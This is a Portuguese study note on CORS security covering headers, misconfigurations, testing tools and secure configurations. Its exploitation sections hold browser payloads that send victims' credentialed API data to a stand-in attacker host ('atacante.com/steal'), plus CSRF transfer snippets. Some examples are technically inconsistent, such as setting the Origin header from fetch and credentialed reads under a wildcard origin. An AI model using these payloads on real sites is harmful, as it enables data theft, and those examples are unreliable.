2025-12-14 22:10

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[CORS]]

----
# Introdução

## O que é CORS?

**CORS** *(Cross-Origin Resource Sharing)* é um mecanismo de segurança implementado pelos navegadores que permite que recursos de uma origem (domínio, protocolo, porta) possam ser acessados por páginas de outra origem.

![[Pasted image 20251214221453.png]]

## A Política de *Same-Origin* (SOP)

Para entender CORS, primeiro é necessário entender a *Same-Origin Policy* (SOP):

- **Definição de "Mesma Origem":** Duas URLs têm a mesma origem se possuem:
	- Mesmo protocol (http/https)
	- Mesmo domínio (exemplo.com)
	- Mesma porta(80/443)

**Exemplos:**

```text
URL 1: https://api.exemplo.com:443/user
URL 2: https://app.exemplo.com:443/dashboard
→ ORIGEM DIFERENTE (subdomínios diferentes)

URL 1: http://exemplo.com:80/home
URL 2: https://exemplo.com:443/home  
→ ORIGEM DIFERENTE (protocolos diferentes)
```

## Por que precisamos de CORS?

Sem CORS, a SOP impediria:

- Chamadas AJAX entre domínios diferentes
- Uso de APIs públicas (Google Maps, Twitter API)
- Microserviços que se comunicam
- CDNs que servem múltiplos domínios.

---
# Como o CORS funciona?

## O Ciclo de Requisição CORS

```text
┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
│    CLIENTE      │─────>│     SERVIDOR    │─────>│    NAVEGADOR    │
│  (Navegador)    │      │   (API/REST)    │      │  (Verificação)  │
└─────────────────┘      └─────────────────┘      └─────────────────┘
        │                         │                         │
        │ 1. Requisição           │ 2. Resposta com         │ 3.Verifica 
		|    Cross-Origin         |    headers CORS         |   headers
        │                         │                         │   CORS
        │                         │                         │
        │<────────────────────────│<────────────────────────│
```

## Headers CORS Principais

### Headers da Requisição (Cliente → Servidor)

```http
Origin: https://app.exemplo.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

### Headers da Resposta (Servidor → Cliente)

```http
Access-Control-Allow-Origin: https://app.exemplo.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Expose-Headers: X-Custom-Header
Access-Control-Max-Age: 86400
```

---
# Mecanismo CORS detalhado

## Tipos de Requisições CORS

### 1. Requisição Simples *(Simple Requests)*

Condições:
- Métodos: GET, HEAD, POST
- Headers permitidos: Accept, Accept-Language, Content-Language, Content-Type
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

**Fluxo:**

```http
GET /api/user HTTP/1.1
Origin: https://app.exemplo.com
Host: api.exemplo.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.exemplo.com
```

### 2. Requisições Pré-Voo *(Preflight Requests)*

Usado para métodos "não simples" (PUT, DELETE, etc.)

**Fluxo:**

```http
# PRIMEIRO: Requisição OPTIONS (preflight)
OPTIONS /api/user HTTP/1.1
Origin: https://app.exemplo.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

# SEGUNDO: Resposta do preflight
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.exemplo.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization
Access-Control-Max-Age: 86400

# TERCEIRO: Requisição real
DELETE /api/user/123 HTTP/1.1
Origin: https://app.exemplo.com
Authorization: Bearer token123
```

### 3. Requisições com Credenciais

```http
// Frontend: deve especificar credentials
fetch('https://api.exemplo.com/data', {
  credentials: 'include'
});

// Backend: deve permitir credenciais
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://app.exemplo.com  // NÃO PODE SER '*'
```

---
# Vulnerabilidades de CORS

## Configurações Perigosas

### 1. `Access-Control-Allow-Origin: *` *(Wildcard)*

```http
Access-Control-Allow-Origin: *
```

**Problema:** Qualquer domínio pode acessar os recursos.
**Quando é aceitável:** APIs públicas que não usam credenciais.

### 2. Reflexão de Origem

```http
Access-Control-Allow-Origin: https://atacante.com
Access-Control-Allow-Credentials: true
```

**Problema:** O servidor reflete o header Origin do cliente sem validação.

### 3. Validação Insuficiente de Subdomínio

```php
// Código vulnerável
$allowed_origins = ['https://exemplo.com'];
$origin = $_SERVER['HTTP_ORIGIN'];

if (in_array($origin, $allowed_origins)) {
    header("Access-Control-Allow-Origin: $origin");
} 
```

**Problema:** e se o origin for `https://atacanteexemplo.com`?

### 4. Allow-Credentials com Wildcard

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Problema:** Inconsistência - navegadores bloqueiam essa combinação.

## Cenários de Ataque

### Ataque 1: Roubo de Dados Sensíveis

```text
Vítima: https://app.banco.com (usa API com CORS mal configurado)
Atacante: https://site-malicioso.com
API: https://api.banco.com (tem CORS: *)
```

### Ataque 2: CSRF com CORS

```js
// O atacante pode fazer requisições autenticadas
fetch('https://api.alvo.com/transfer', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({amount: 1000, to: 'atacante'})
});
```

---
# Métodos de Exploração

## Técnicas Comuns de Exploração

### 1. Técnicas de Configuração Incorreta

```html
<!-- Página do atacante -->
<script>
fetch('https://api.alvo.com/user/data', {
  credentials: 'include'
})
.then(response => response.text())
.then(data => {
  // Envia dados para servidor do atacante
  fetch('https://atacante.com/steal', {
    method: 'POST',
    body: data
  });
});
</script>
```

### 2. Abuso de Validação Fraca

```js
// Se o servidor valida apenas "contém domínio"
// Domínio do atacante: https://exemplo.com.atacante.net

fetch('https://api.alvo.com/data', {
  headers: {
    'Origin': 'https://exemplo.com.atacante.net'
  },
  credentials: 'include'
});
```

### 3. Null Origin Exploitation

```js
// Em iframes sandboxed, Origin pode ser "null"
var iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts';
iframe.srcdoc = `
<script>
fetch('https://api.alvo.com/data', {
  headers: {Origin: 'null'},
  credentials: 'include'
})
</script>`;
```

---
# Testando Vulnerabilidades CORS

## Metodologia de Teste

### Passo 1: Identificar Endpoints CORS

```bash
# Usar ferramentas para encontrar endpoints
gobuster dir -u https://api.alvo.com -w common.txt
nmap --script http-cors -p 443 api.alvo.com
```

### Passo 2: Testar Configurações Básicas

```js
// Teste manual no console do navegador
async function testCORS(url) {
  const tests = [
    {origin: 'https://evil.com'},
    {origin: 'http://evil.com'},
    {origin: 'https://alvo.com.evil.com'},
    {origin: 'https://alvo.com'},
    {origin: 'null'},
    {origin: 'https://alvo.com:8080'},
    {origin: 'http://alvo.com'}
  ];
  
  for (let test of tests) {
    try {
      const response = await fetch(url, {
        headers: {Origin: test.origin},
        credentials: 'include'
      });
      console.log(`Origin ${test.origin}:`, 
        response.headers.get('Access-Control-Allow-Origin'));
    } catch (e) {
      console.log(`Origin ${test.origin}:`, 'Blocked');
    }
  }
}
```

### Passo 3: Testar Validações de Subdomínio

```python
#!/usr/bin/env python3
import requests

def test_subdomain_validation(target):
    test_origins = [
        f"https://{target}",
        f"https://www.{target}",
        f"http://{target}",
        f"https://{target}.evil.com",
        f"https://evil-{target}.com",
        f"https://{target}%40evil.com",
        f"https://{target}.com.evil.com",
    ]
    
    for origin in test_origins:
        headers = {'Origin': origin}
        response = requests.get(target, headers=headers)
        
        acao = response.headers.get('Access-Control-Allow-Origin')
        acac = response.headers.get('Access-Control-Allow-Credentials')
        
        print(f"Origin: {origin}")
        print(f"  ACAO: {acao}")
        print(f"  ACAC: {acac}")
        print()
```

---
# Ferramentas de Teste

## Ferramentas Especializadas

### 1. CORS Scanner (Burp Suite Extension)

**Instalação:**
- BApp Store → "CORS Scanner"

**Uso:**

```bash
# Configuração automática
1. Ative a extensão
2. Navegue normalmente pelo Burp
3. A extensão detecta automaticamente vulnerabilidades CORS
```

### 2. CORStest (Python)

```bash
# Instalação
pip install corstest

# Uso
corstest -u https://api.alvo.com/api/user
corstest -u https://api.alvo.com -m POST -H "Authorization: Bearer"
```

### 3. CORS Misconfiguration Scanner

```bash
# Clonar repositório
git clone https://github.com/chenjj/CORScanner.git

# Executar
python cors_scan.py -u https://api.alvo.com -v
```

### 4. Teste com cURL

```bash
# Teste simples
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS https://api.alvo.com/api/user \
     -I

# Teste com credenciais
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=123" \
     https://api.alvo.com/api/user \
     -I
```

## Ferramentas de Proxy

### Burp Suite Configuration

```bash
# No Burp, configurar para testar CORS:
1. Proxy → Options → Match and Replace
2. Add rule:
   Type: Request header
   Match: ^Origin:.*$
   Replace: Origin: https://evil.com
3. Ativar a regra
```

### OWASP ZAP

```bash
# Usar script ZAP para CORS
python zap-cors-scan.py -t https://api.alvo.com
```

---
# Exemplos Práticos de Exploração

## Exemplo 1: API Bancária com CORS Mal Configurado

**Cenário:**

```text
API: https://api.banco.com
Frontend: https://app.banco.com
Vulnerabilidade: Access-Control-Allow-Origin: *
```

**Exploração:**

```html
<!-- Página do atacante: https://phishing.com -->
<!DOCTYPE html>
<html>
<body>
<script>
async function stealData() {
  // Tenta acessar dados sensíveis
  const response = await fetch('https://api.banco.com/accounts', {
    credentials: 'include'  // Envia cookies da vítima
  });
  
  const accounts = await response.json();
  
  // Envia para servidor do atacante
  await fetch('https://atacante.com/steal', {
    method: 'POST',
    body: JSON.stringify(accounts)
  });
}

// Executa quando a vítima visita
stealData();
</script>
<p>Página falsa do banco...</p>
</body>
</html>
```

## Exemplo 2: Validação de Subdomínio Fraca

**Código vulnerável no servidor:**

```python
# Vulnerável: apenas verifica se o domínio termina com "alvo.com"
def validate_origin(origin):
    if origin.endswith('alvo.com'):
        return origin
    return None
```

**Exploração:**

```js
// Domínio do atacante: evilalvo.com
fetch('https://api.alvo.com/data', {
  headers: {
    'Origin': 'https://app.evilalvo.com'
  },
  credentials: 'include'
});
```

## Exemplo 3: Credenciais com Origin Dinâmico

**Cenário:** O servidor reflete qualquer Origin enviado.

```php
// CÓDIGO PERIGOSO
$origin = $_SERVER['HTTP_ORIGIN'];
header("Access-Control-Allow-Origin: $origin");
header("Access-Control-Allow-Credentials: true");
```

**Payload de Exploração:**

```html
<script>
// Envia requisição com Origin controlado pelo atacante
fetch('https://api.alvo.com/user/profile', {
  method: 'GET',
  headers: {
    'Origin': 'https://evil.com'
  },
  credentials: 'include',
  mode: 'cors'
})
.then(response => response.json())
.then(data => {
  // Dados roubados
  console.log(data);
});
</script>
```

---
# Técnicos de Bypass Avançadas

## Bypass 1: Using HTTP para HTTPs

```js
// Se o servidor aceita HTTP e HTTPS como equivalentes
fetch('http://api.alvo.com/data', {
  headers: {'Origin': 'https://evil.com'},
  credentials: 'include'
});
```

## Bypass 2: Abusando de CORS Preflight Cache

```js
// Enviar preflight com método permitido
// Depois enviar requisição real com método diferente
fetch('https://api.alvo.com/data', {
  method: 'PUT',  // Não permitido normalmente
  headers: {
    'Origin': 'https://evil.com',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({malicious: true})
});
```

## Bypass 3: XSS + CORS

```js
// Se há XSS no domínio alvo, pode-se usar para bypass CORS
// Código injetado via XSS no alvo.com:
fetch('https://api.alvo.com/admin/data', {
  credentials: 'include'
})
.then(data => {
  // Envia para atacante
  fetch('https://atacante.com/steal', {
    method: 'POST',
    body: data
  });
});
```

## Bypass 4: DNS Rebinding Attack

```bash
1. Configurar DNS para alternar entre IPs
2. Primeira requisição: IP legítimo (passa CORS)
3. Segunda requisição: IP malicioso (usa credenciais)
```

---
# Impacto e Consequências

## Impactos Potenciais

### 1. Roubo de Dados Sensíveis

- Informações de usuários
- Tokens de sessão
- Dados financeiros
- Informações pessoais (PII)

### 2. Elevação de Privilégio

- Acesso a funcionalidades administrativas
- Modificação de dados de outros usuários

### 3. Ataques CSRF Aprimorados

```js
// CORS mal configurado + credenciais = CSRF poderoso
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({
    to: 'attacker-account',
    amount: 10000
  })
});
```

## Exemplos Reais de Exploração

### Caso 1: Yahoo Mail (2014)

- **Vulnerabilidade**: CORS misconfiguration
- **Impacto**: Acesso a emails de usuários
- **Bounty**: $10,000

### Caso 2: Google Services

- **Vulnerabilidade**: Validação insuficiente de subdomínio    
- **Impacto**: Possível acesso a dados de usuário
- **Correção**: Validação estrita de domínio

---
# Mitigação e Boas Práticas

## Configuração Seguras de CORS

### 1. Lista Branca de Origens *(Whitelist)*

```python
# Exemplo em Python/Flask
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)

allowed_origins = [
    'https://app.exemplo.com',
    'https://admin.exemplo.com',
    'https://exemplo.com'
]

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    
    if origin in allowed_origins:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    
    return response
```

### 2. Validação Rigorosa de Domínio

```js
// Node.js/Express com validação rigorosa
const express = require('express');
const cors = require('cors');

const app = express();

const corsOptions = {
  origin: function (origin, callback) {
    // Permitir requisições sem Origin (mobile apps, curl, etc)
    if (!origin) return callback(null, true);
    
    // Validação estrita do domínio
    const allowedDomains = [
      'https://app.exemplo.com',
      'https://admin.exemplo.com'
    ];
    
    if (allowedDomains.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('CORS não permitido'));
    }
  },
  credentials: true,
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
```

### 3. Configuração Segura em Nginx

```nginx
# Configuração segura de CORS no Nginx
server {
    listen 443 ssl;
    server_name api.exemplo.com;
    
    # Lista de origens permitidas
    set $cors_origin "";
    
    if ($http_origin ~* "^https://app\.exemplo\.com$") {
        set $cors_origin $http_origin;
    }
    
    if ($http_origin ~* "^https://admin\.exemplo\.com$") {
        set $cors_origin $http_origin;
    }
    
    location /api/ {
        if ($cors_origin != "") {
            add_header 'Access-Control-Allow-Origin' $cors_origin always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Authorization, Content-Type' always;
        }
        
        # Para requisições OPTIONS (preflight)
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Max-Age' 1728000;
            add_header 'Content-Type' 'text/plain charset=UTF-8';
            add_header 'Content-Length' 0;
            return 204;
        }
        
        proxy_pass http://backend;
    }
}
```

## Headers de Segurança Adicionais

### *Content Security Policy* (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

### Outros Headers Protetores

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

## Validação no Backend

Exemplo em Java Spring

```java
@Configuration
@EnableWebMvc
public class WebConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins(
                "https://app.exemplo.com",
                "https://admin.exemplo.com"
            )
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("Authorization", "Content-Type")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

## Monitoramento e Logging

Log de tentativas de CORS

```python
# Log de origens suspeitas
import logging

logger = logging.getLogger('cors_monitor')

def check_cors_origin(origin):
    allowed = ['https://app.exemplo.com']
    
    if origin not in allowed:
        logger.warning(f'Tentativa de acesso CORS de origem suspeita: {origin}')
        logger.warning(f'IP: {request.remote_addr}')
        logger.warning(f'User-Agent: {request.headers.get("User-Agent")}')
    
    return origin in allowed
```

---
# Cenários Reais

## Cenário 1: Aplicação Single Page (SPA) + API

**Configuração:**

- Frontend: https://app.exemplo.com (React/Vue/Angular)
- Backend API: https://api.exemplo.com

**Configuração Segura:**

```js
// Frontend: axios configuration
import axios from 'axios';

axios.defaults.baseURL = 'https://api.exemplo.com';
axios.defaults.withCredentials = true;

// Backend: CORS configuration
const allowedOrigins = [
  'https://app.exemplo.com',
  'https://staging.exemplo.com'
];
```

## Cenário 2: API Pública

Para APIs públicas que não usam credenciais:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
Access-Control-Max-Age: 86400
# NUNCA usar Access-Control-Allow-Credentials: true com *
```

## Cenário 3: Aplicação Mobile

Mobile apps têm origem `null` ou `fille://`:

```js
// Tratamento especial para mobile
const origin = request.headers.get('Origin');

if (origin === 'null' || origin.startsWith('file://')) {
    // Verificar token de aplicação mobile
    const appToken = request.headers.get('X-App-Token');
    if (validAppToken(appToken)) {
        response.headers['Access-Control-Allow-Origin'] = origin;
    }
}
```

---
# Checklist de Segurança CORS

## Checklist para Desenvolvedores

### Configuração de Servidor

- Implementar lista branca de origens
- Nunca usar `*` com `Allow-Credentials: true`
- Validar completamente o domínio (não apenas substring)
- Implementar headers de segurança adicionais
- Configurar timeout apropriado para preflight cache

### Validação de Implementação

- Testar com origens maliciosas    
- Verificar subdomínios e variações
- Testar com protocolos diferentes (HTTP vs HTTPS)
- Testar com porta diferente
- Testar com `null` origin

### Monitoramento

- Logar tentativas de acesso CORS suspeitas    
- Monitorar headers CORS em produção
- Revisar regularmente a lista de origens permitidas

## Checklist para Testadores/Pentesters

### Testes a Realizar

- Enumerar todos os endpoints da aplicação
- Testar cada endpoint com diferentes origens
- Verificar combinação com credenciais
- Testar validação de subdomínio
- Tentar bypass com encoding especial
- Verificar cache de preflight
- Testar com métodos HTTP diferentes

### Ferramentas a Usar

- Burp Suite com extensão CORS    
- CORScanner
- Testes manuais com cURL/browser
- Scripts personalizados para validação

---
# Conclusão

CORS é um mecanismo essencial para aplicações web modernas, mas quando mal configurado, pode se tornar uma vulnerabilidade crítica. A chave para a segurança está em:

1. **Implementação correta**: Lista branca estrita de origens
2. **Validação rigorosa**: Não confiar apenas em verificações de substring
3. **Configuração consciente**: Entender quando usar wildcard e quando não usar
4. **Monitoramento contínuo**: Logar e alertar sobre atividades suspeitas
5. **Defesa em profundidade**: Combinar CORS com outras medidas de segurança

---
# Referências

#### Documentação Oficial

- [MDN Web Docs: CORS](https://developer.mozilla.org/pt-BR/docs/Web/HTTP/CORS)
- [OWASP CORS Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)

#### Ferramentas

- [CORScanner](https://github.com/chenjj/CORScanner)
- [CORS Misconfig Scanner](https://github.com/shivsahni/CORSScanner)

#### Laboratórios Práticos

- PortSwigger Web Security Academy: CORS labs
- HackTheBox machines com vulnerabilidades CORS
- TryHackMe CORS modules
    

#### Referências Acadêmicas

- "The Unexpected Dangers of Dynamic CORS" - BlackHat 2017
- "CORS Misconfigurations on a Large Scale" - Usenix Security 2019

>[!warning] Atenção:
>Lembre-se: **Sempre teste em ambientes autorizados** e use este conhecimento para proteger aplicações, não para atacá-las sem permissão.

